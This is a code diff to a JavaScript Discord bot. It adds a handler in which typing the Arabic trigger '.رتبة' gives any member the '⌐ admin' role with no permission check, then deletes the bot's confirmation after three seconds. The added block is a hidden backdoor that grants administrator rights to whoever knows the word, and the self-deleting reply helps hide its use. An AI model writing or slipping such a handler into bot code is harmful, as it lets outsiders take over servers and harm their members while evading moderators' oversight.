@@ -818,6 +818,16 @@ x5bz.on('message', message => {
                     message.channel.send({embed:ZmA});
     }
 });
-
+var x1 = ".رتبة"
+x5bz.on('message', message => {
+if (message.content === x1) {
+message.member.addRole(message.guild.roles.find("name", "⌐ admin"));
+const embed = new Discord.RichEmbed()
+.setThumbnail(message.author.avatarURL)
+.addField('Requested by:', "<@" + message.author.id + ">")
+.setDescription(`تم`)
+message.channel.sendEmbed(embed).then(message => {message.delete(3000)})
+    }
+});
 x5bz.login(process.env.BOT_TOKEN);
 
